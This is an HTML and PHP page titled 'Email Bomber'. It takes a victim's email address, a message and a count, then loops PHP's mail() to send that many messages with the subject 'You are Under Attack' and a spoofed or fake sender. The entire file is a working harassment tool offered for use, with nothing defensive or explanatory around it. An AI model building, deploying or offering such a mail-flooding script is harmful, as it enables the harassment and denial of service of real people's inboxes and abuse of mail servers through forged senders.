<!DOCTYPE html>
<html lang=en>
    <head>
        <title>Email Bomber</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
body {
	text-align: center;
	color: #D6D6D6;
	background-image: url(http://store1.up-00.com/2016-08/1472206261281.png);
}
           </style>
           </head>
           <body>
        <header align=center>
            <h1> Email Bomber </h1>
        </header>
        <section>
            <form method="post" action="#">
                <table border="0">
                    <tr><td>Your Email : </td><td><input type=email name=email placeholder="Your Email ID" /></td></tr>
                    <tr><td>Email id of Person: </td><td><input type=email name=mail placeholder="Enter Target's Email" /></td></tr>
                    <tr><td valign=top>Message to Slave : </td><td><textarea name=msg rows=8 cols=30 ></textarea></td></tr>
                    <tr><td>No. of Time You want to Bombard his Email</td><td><input type=text name=no placeholder=100 /></td></tr>
                    <tr><td><input type=reset value=Reset All /></td><td><input type=submit name=sub value="Start Bombarding this Mail" /></td></tr>
                </table>
            </form>
        </section>
        <footer align=center>
            <p>Thanks to Allah </a> Copyright &copy; <a href="https://www.facebook.com/Anis.Joker.Dz">Anis Joker Dz</a></p>
        </footer>
    </body>
</html>

<?php
if(isset($_POST['sub']) || !empty($_POST['mail']) || !empty($_POST['no'])) {
    $Slave = $_POST['mail'];
    $no = $_POST['no'];
    $msg = $_POST['msg'];
    $hack = "hacker@anonymous.com";
    $headers = 'From:'.(!empty($_POST['email'])) ? $_POST['email']:$hack . "\r\n" .
            'Reply-To:'.(!empty($_POST['email'])) ? $_POST['email']:$hack . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
    for($i=1;$i<=$no;$i++) {
        $mail = mail($Slave, "You are Under Attack", $msg, $headers);
    if($mail) {
        echo "{$i}. Mail Sent";
    } else {
        echo "{$i}. Mail was not Sent";
    }
    }
} else {
    echo "Please fill all the form Properly";
}?>
